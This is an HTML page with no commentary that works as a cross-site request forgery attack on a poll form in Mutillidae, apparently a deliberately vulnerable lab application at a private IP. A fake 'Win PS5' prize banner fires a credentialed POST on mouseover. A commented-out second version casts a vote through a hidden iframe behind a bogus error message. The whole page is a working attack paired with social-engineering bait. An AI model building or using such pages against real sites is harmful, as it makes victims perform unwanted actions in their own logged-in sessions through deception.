<html>
<head>
<title>Win Free Game Consoles Site</title>
<style>
div.error {
	background: red;
	color: #ffffff;
	text-decoration: none;
	font-size: 30px;
	width:400px;
	margin-left: 37%;
	margin-top: 10%;
	padding: 30px;
	display: inline-block;
	border-radius: 15px;
}
</style>
</head>
<body>
<script>
function hackFunction() {
    var parameters = 'choice=kismet&initials=';
    var body = '&user-poll-php-submit-button=Submit+Vote&csrf-token=';
    parameters = parameters.concat(body);
    var http = new XMLHttpRequest();
    http.open('POST', 'http://192.168.10.130/mutillidae/index.php?page=user-poll.php', true);
    http.withCredentials = true;
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.setRequestHeader('Content-length', parameters.length);
    http.setRequestHeader('Connection', 'close');
    http.send(parameters);
}
</script>
<div class="error" onmouseover="hackFunction()">Click and win PS5!</div>
</body>
</html>

<!-- VOTING WITH GET METHOD
<html>
<head>
<title>Win Free Game Consoles Site</title>
<style>
h5.error {
	background: red;
	color: #ffffff;
	text-decoration: none;
	font-size: 30px;
	width:690px;
	margin-left: 25%;
	margin-top: 10%;
	padding: 30px;
	display: inline-block;
	border-radius: 15px;
}
</style>
</head>
<body>
<iframe src="http://192.168.10.130/mutillidae/index.php?page=user-poll.php&csrf-token=&choice=netcat&initials=&user-poll-php-submit-button=Submit+Vote" style="display:none"></iframe>
<h5 class="error">Ops, there is a problem! Please try again!</h5>
</body>
</html> -->